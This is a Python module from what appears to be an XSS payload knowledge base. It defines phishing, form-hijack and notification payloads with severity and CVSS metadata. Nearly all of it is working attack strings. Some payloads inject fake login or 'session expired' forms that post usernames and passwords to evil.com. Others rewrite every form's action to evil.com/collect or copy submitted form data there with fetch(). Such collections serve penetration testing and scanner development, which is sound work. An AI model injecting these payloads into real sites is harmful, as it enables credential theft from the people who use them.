#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Phishing XSS Payloads
"""

from ..models import PayloadEntry


PHISHING_PAYLOADS = {
    "phish_1": PayloadEntry(
        payload="<form action='//evil.com/collect' method=post><input name=user placeholder='Username'><input name=pass type=password placeholder='Password'><button>Login</button></form>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=9.0,
        description="Fake login form",
        tags=["phishing", "form", "credentials"],
        reliability="high",
    ),
    "phish_2": PayloadEntry(
        payload="<script>document.body.innerHTML='<h1>Session Expired</h1><form action=//evil.com/collect method=post><input name=user placeholder=Username><input name=pass type=password><button>Login</button></form>'</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Full page takeover phishing",
        tags=["phishing", "takeover", "credentials"],
        reliability="high",
    ),
    "phish_3": PayloadEntry(
        payload="<div style='position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999'><h1>Please re-enter credentials</h1><form action=//evil.com method=post><input name=u><input name=p type=password><button>Submit</button></form></div>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=9.0,
        description="Overlay phishing",
        tags=["phishing", "overlay", "credentials"],
        reliability="high",
    ),
}

FORM_HIJACK_PAYLOADS = {
    "formhijack_1": PayloadEntry(
        payload="<script>document.forms[0].action='//evil.com/collect'</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Hijack first form action",
        tags=["form", "hijack", "action"],
        reliability="high",
    ),
    "formhijack_2": PayloadEntry(
        payload="<script>document.querySelectorAll('form').forEach(f=>f.action='//evil.com/collect')</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Hijack all form actions",
        tags=["form", "hijack", "all"],
        reliability="high",
    ),
    "formhijack_3": PayloadEntry(
        payload="<script>document.querySelectorAll('form').forEach(f=>f.addEventListener('submit',e=>{fetch('//evil.com/collect',{method:'POST',body:new FormData(f)})}))</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Clone form data on submit",
        tags=["form", "hijack", "clone"],
        reliability="high",
    ),
}

NOTIFICATION_PAYLOADS = {
    "notif_1": PayloadEntry(
        payload="<script>Notification.requestPermission().then(()=>new Notification('XSS!'))</script>",
        contexts=["html_content", "javascript"],
        severity="medium",
        cvss_score=5.0,
        description="Browser notification",
        tags=["notification", "spam"],
        reliability="medium",
    ),
    "notif_2": PayloadEntry(
        payload="<script>if(Notification.permission==='granted'){new Notification('XSS!',{body:'Hacked'})}</script>",
        contexts=["html_content", "javascript"],
        severity="medium",
        cvss_score=5.0,
        description="Notification if permitted",
        tags=["notification", "check"],
        reliability="medium",
    ),
}

# Combined database
PHISHING_DATABASE = {
    **PHISHING_PAYLOADS,
    **FORM_HIJACK_PAYLOADS,
    **NOTIFICATION_PAYLOADS,
}
PHISHING_TOTAL = len(PHISHING_DATABASE)
